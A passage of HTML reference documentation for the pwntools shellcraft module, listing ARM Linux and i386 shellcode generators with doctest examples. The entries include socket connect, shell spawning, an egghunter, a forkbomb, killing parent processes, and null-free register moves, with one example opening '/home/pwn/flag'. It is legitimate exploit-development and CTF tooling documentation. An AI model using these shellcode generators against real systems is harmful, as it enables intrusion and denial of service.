<code class="descclassname">pwnlib.shellcraft.arm.linux.</code><code class="descname">connect</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>network='ipv4'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/linux/connect.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.linux.connect" title="Permalink to this definition">¶</a></dt>
<dd><p>Connects to the host on the specified port.
Network is either &#8216;ipv4&#8217; or &#8216;ipv6&#8217;.
Leaves the connected socket in R6.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.linux.dir">
<code class="descclassname">pwnlib.shellcraft.arm.linux.</code><code class="descname">dir</code><span class="sig-paren">(</span><em>in_fd='r6'</em>, <em>size=2048</em>, <em>allocate_stack=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/linux/dir.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.linux.dir" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads to the stack from a directory.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>in_fd</strong> (<em>int/str</em>) &#8211; File descriptor to be read from.</li>
<li><strong>size</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Buffer size.</li>
<li><strong>allocate_stack</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; allocate &#8216;size&#8217; bytes on the stack.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>You can optioanlly shave a few bytes not allocating the stack space.</p>
<p>The size read is left in eax.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.linux.echo">
<code class="descclassname">pwnlib.shellcraft.arm.linux.</code><code class="descname">echo</code><span class="sig-paren">(</span><em>string</em>, <em>sock='1'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/linux/echo.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.linux.echo" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a string to a file descriptor</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="s1">&#39;hello</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.linux.egghunter">
<code class="descclassname">pwnlib.shellcraft.arm.linux.</code><code class="descname">egghunter</code><span class="sig-paren">(</span><em>egg</em>, <em>start_address = 0</em>, <em>double_check = True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/linux/egghunter.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.linux.egghunter" title="Permalink to this definition">¶</a></dt>
<dd><p>Searches for an egg, which is either a four byte integer
or a four byte string. The egg must appear twice in a row
if double_check is True.
When the egg has been found the egghunter branches to the
address following it.
If start_address has been specified search will start on the
first address of the page that contains that address.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.linux.forkbomb">
<code class="descclassname">pwnlib.shellcraft.arm.linux.</code><code class="descname">forkbomb</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/linux/forkbomb.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.linux.forkbomb" title="Permalink to this definition">¶</a></dt>
<dd><p>Performs a forkbomb attack.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.linux.forkexit">
<code class="descclassname">pwnlib.shellcraft.arm.linux.</code><code class="descname">forkexit</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/linux/forkexit.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.linux.forkexit" title="Permalink to this definition">¶</a></dt>
<dd><p>Attempts to fork.  If the fork is successful, the parent exits.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.linux.killparent">
<code class="descclassname">pwnlib.shellcraft.arm.linux.</code><code class="descname">killparent</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/linux/killparent.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.linux.killparent" title="Permalink to this definition">¶</a></dt>
<dd><p>Kills its parent process until whatever the parent is (probably init)
cannot be killed any longer.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.linux.open_file">
<code class="descclassname">pwnlib.shellcraft.arm.linux.</code><code class="descname">open_file</code><span class="sig-paren">(</span><em>filepath</em>, <em>flags='O_RDONLY'</em>, <em>mode=420</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/linux/open_file.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.linux.open_file" title="Permalink to this definition">¶</a></dt>
<dd><p>Opens a file. Leaves the file descriptor in r0.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>filepath</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The file to open.</li>
<li><strong>flags</strong> (<em>int/str</em>) &#8211; The flags to call open with.</li>
<li><strong>mode</strong> (<em>int/str</em>) &#8211; The attribute to create the flag. Only matters of <code class="docutils literal"><span class="pre">flags</span> <span class="pre">&amp;</span> <span class="pre">O_CREAT</span></code> is set.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.linux.sh">
<code class="descclassname">pwnlib.shellcraft.arm.linux.</code><code class="descname">sh</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/linux/sh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.linux.sh" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute a different process.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;echo Hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.arm.linux.syscall">
<code class="descclassname">pwnlib.shellcraft.arm.linux.</code><code class="descname">syscall</code><span class="sig-paren">(</span><em>syscall=None</em>, <em>arg0=None</em>, <em>arg1=None</em>, <em>arg2=None</em>, <em>arg3=None</em>, <em>arg4=None</em>, <em>arg5=None</em>, <em>arg6=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/arm/linux/syscall.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.arm.linux.syscall" title="Permalink to this definition">¶</a></dt>
<dd><dl class="docutils">
<dt>Args: [syscall_number, *args]</dt>
<dd>Does a syscall</dd>
</dl>
<p>Any of the arguments can be expressions to be evaluated by <code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code>.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call syscall(11, 1, &#39;sp&#39;, 2, 0) */</span>
<span class="go">    mov  r0, #1</span>
<span class="go">    mov  r1, sp</span>
<span class="go">    mov  r2, #2</span>
<span class="go">    eor  r3, r3 /* 0 (#0) */</span>
<span class="go">    mov  r7, #0xb</span>
<span class="go">    svc  0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;SYS_exit&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call exit(0) */</span>
<span class="go">    eor  r0, r0 /* 0 (#0) */</span>
<span class="go">    mov  r7, #SYS_exit /* 1 */</span>
<span class="go">    svc  0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;/home/pwn/flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* open(file=&#39;/home/pwn/flag&#39;, oflag=0, mode=0) */</span>
<span class="go">    /* push &#39;/home/pwn/flag\x00A&#39; */</span>
<span class="go">    movw r7, #0x41006761 &amp; 0xffff</span>
<span class="go">    movt r7, #0x41006761 &gt;&gt; 16</span>
<span class="go">    push {r7}</span>
<span class="go">    movw r7, #0x6c662f6e &amp; 0xffff</span>
<span class="go">    movt r7, #0x6c662f6e &gt;&gt; 16</span>
<span class="go">    push {r7}</span>
<span class="go">    movw r7, #0x77702f65 &amp; 0xffff</span>
<span class="go">    movt r7, #0x77702f65 &gt;&gt; 16</span>
<span class="go">    push {r7}</span>
<span class="go">    movw r7, #0x6d6f682f &amp; 0xffff</span>
<span class="go">    movt r7, #0x6d6f682f &gt;&gt; 16</span>
<span class="go">    push {r7}</span>
<span class="go">    mov  r0, sp</span>
<span class="go">    eor  r1, r1 /* 0 (#0) */</span>
<span class="go">    eor  r2, r2 /* 0 (#0) */</span>
<span class="go">    /* call open() */</span>
<span class="go">    mov  r7, #SYS_open /* 5 */</span>
<span class="go">    svc  0</span>
</pre></div>
</div>
</dd></dl>

</div>
</div>
<span id="document-shellcraft/common"></span><div class="section" id="module-pwnlib.shellcraft.common">
<span id="pwnlib-shellcraft-common-shellcode-common-to-all-architecture"></span><h5><a class="reference internal" href="#module-pwnlib.shellcraft.common" title="pwnlib.shellcraft.common"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.common</span></code></a> &#8212; Shellcode common to all architecture<a class="headerlink" href="#module-pwnlib.shellcraft.common" title="Permalink to this headline">¶</a></h5>
<p>Shellcraft module containing shellcode common to all platforms.</p>
<dl class="function">
<dt id="pwnlib.shellcraft.common.label">
<code class="descclassname">pwnlib.shellcraft.common.</code><code class="descname">label</code><span class="sig-paren">(</span><em>prefix='label'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/common/label.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.common.label" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a new unique label with a given prefix.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>prefix</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The string to prefix the label with</td>
</tr>
</tbody>
</table>
</dd></dl>

</div>
<span id="document-shellcraft/i386"></span><div class="section" id="pwnlib-shellcraft-i386-shellcode-for-intel-80386">
<h5><a class="reference internal" href="#module-pwnlib.shellcraft.i386" title="pwnlib.shellcraft.i386"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.i386</span></code></a> &#8212; Shellcode for Intel 80386<a class="headerlink" href="#pwnlib-shellcraft-i386-shellcode-for-intel-80386" title="Permalink to this headline">¶</a></h5>
<div class="section" id="module-pwnlib.shellcraft.i386">
<span id="pwnlib-shellcraft-i386"></span><h6><a class="reference internal" href="#module-pwnlib.shellcraft.i386" title="pwnlib.shellcraft.i386"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.i386</span></code></a><a class="headerlink" href="#module-pwnlib.shellcraft.i386" title="Permalink to this headline">¶</a></h6>
<p>Shellcraft module containing generic Intel i386 shellcodes.</p>
<dl class="function">
<dt id="pwnlib.shellcraft.i386.breakpoint">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">breakpoint</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/breakpoint.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.breakpoint" title="Permalink to this definition">¶</a></dt>
<dd><p>A single-byte breakpoint instruction.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.crash">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">crash</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/crash.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.crash" title="Permalink to this definition">¶</a></dt>
<dd><p>Crash.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">crash</span><span class="p">())</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
<span class="go">-11</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.epilog">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">epilog</code><span class="sig-paren">(</span><em>nargs=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/epilog.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.epilog" title="Permalink to this definition">¶</a></dt>
<dd><p>Function epilogue.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>nargs</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number of arguments to pop off the stack.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.function">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">function</code><span class="sig-paren">(</span><em>name</em>, <em>template_function</em>, <em>*registers</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/function.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.function" title="Permalink to this definition">¶</a></dt>
<dd><p>Converts a shellcraft template into a callable function.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>template_sz</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#callable" title="(in Python v2.7)"><em>callable</em></a>) &#8211; Rendered shellcode template.  Any variable Arguments
should be supplied as registers.</li>
<li><strong>name</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Name of the function.</li>
<li><strong>registers</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; List of registers which should be filled from the stack.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">function</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">write</span><span class="p">,</span> <span class="p">)</span>

<span class="gp">&gt;&gt;&gt; </span><span class="n">hello</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="s2">&quot;Hello!&quot;</span><span class="p">,</span> <span class="s1">&#39;eax&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">hello_fn</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">function</span><span class="p">(</span><span class="n">hello</span><span class="p">,</span> <span class="s1">&#39;eax&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">exit</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="s1">&#39;edi&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">exit_fn</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">function</span><span class="p">(</span><span class="n">exit</span><span class="p">,</span> <span class="s1">&#39;edi&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="gp">... </span><span class="s1">    push STDOUT_FILENO</span>
<span class="gp">... </span><span class="s1">    call hello</span>
<span class="gp">... </span><span class="s1">    push 33</span>
<span class="gp">... </span><span class="s1">    call exit</span>
<span class="gp">... </span><span class="s1">hello:</span>
<span class="gp">... </span><span class="s1">    </span><span class="si">%(hello_fn)s</span><span class="s1"></span>
<span class="gp">... </span><span class="s1">exit:</span>
<span class="gp">... </span><span class="s1">    </span><span class="si">%(exit_fn)s</span><span class="s1"></span>
<span class="gp">... </span><span class="s1">&#39;&#39;&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">locals</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;Hello!&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">wait_for_close</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">poll</span><span class="p">()</span>
<span class="go">33</span>
</pre></div>
</div>
<p class="rubric">Notes</p>
<p>Can only be used on a shellcraft template which takes
all of its arguments as registers.  For example, the
pushstr</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.getpc">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">getpc</code><span class="sig-paren">(</span><em>register='ecx'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/getpc.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.getpc" title="Permalink to this definition">¶</a></dt>
<dd><p>Retrieves the value of EIP, stores it in the desired register.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>return_value</strong> &#8211; Value to return</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.infloop">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">infloop</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/infloop.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.infloop" title="Permalink to this definition">¶</a></dt>
<dd><p>A two-byte infinite loop.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.itoa">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">itoa</code><span class="sig-paren">(</span><em>v</em>, <em>buffer='esp'</em>, <em>allocate_stack=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/itoa.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.itoa" title="Permalink to this definition">¶</a></dt>
<dd><p>Converts an integer into its string representation, and pushes it
onto the stack.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>v</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>, </em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Integer constant or register that contains the value to convert.</li>
<li><strong>alloca</strong> &#8211; </li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">itoa</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="go">&#39;3735928559\x00&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.memcpy">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">memcpy</code><span class="sig-paren">(</span><em>dest</em>, <em>src</em>, <em>n</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/memcpy.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.memcpy" title="Permalink to this definition">¶</a></dt>
<dd><p>Copies memory.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>dest</strong> &#8211; Destination address</li>
<li><strong>src</strong> &#8211; Source address</li>
<li><strong>n</strong> &#8211; Number of bytes</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.mov">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">mov</code><span class="sig-paren">(</span><em>dest</em>, <em>src</em>, <em>stack_allowed=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/mov.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.mov" title="Permalink to this definition">¶</a></dt>
<dd><p>Move src into dest without newlines and null bytes.</p>
<p>If the src is a register smaller than the dest, then it will be
zero-extended to fit inside the larger register.</p>
<p>If the src is a register larger than the dest, then only some of the bits will
be used.</p>
<p>If src is a string that is not a register, then it will locally set
<cite>context.arch</cite> to <cite>&#8216;i386&#8217;</cite> and use <code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code> to evaluate the
string. Note that this means that this shellcode can change behavior depending
on the value of <cite>context.os</cite>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>dest</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The destination register.</li>
<li><strong>src</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Either the input register, or an immediate value.</li>
<li><strong>stack_allowed</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Can the stack be used?</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span><span class="s1">&#39;ebx&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov eax, ebx</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor eax, eax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;ax&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor ax, ax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;ax&#39;</span><span class="p">,</span> <span class="mi">17</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor ax, ax</span>
<span class="go">    mov al, 0x11</span>
